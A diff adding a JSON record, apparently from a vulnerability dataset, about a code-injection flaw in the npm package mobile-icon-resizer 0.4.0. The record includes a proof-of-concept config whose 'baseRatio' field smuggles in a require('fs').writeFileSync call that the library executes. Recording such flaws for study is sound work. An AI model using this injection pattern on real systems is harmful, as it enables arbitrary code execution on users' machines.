@@ -1,0 +1,8 @@
+{
+  "id": "",
+  "upstream": "mobile-icon-resizer@0.4.0",
+  "keymethod": "#main",
+  "keystring": " //config file let config = { iOS: { images:[] }, android: { images: [ { baseRatio: 'require(\"fs\").writeFileSync(\"mobile-icon-resizer\", \"\")',  folder: \"drawable-mdpi\", } ] } } exports = module.exports = config;",
+  "location": "lib/resize.js:31:15",
+  "downstreams": []
+}
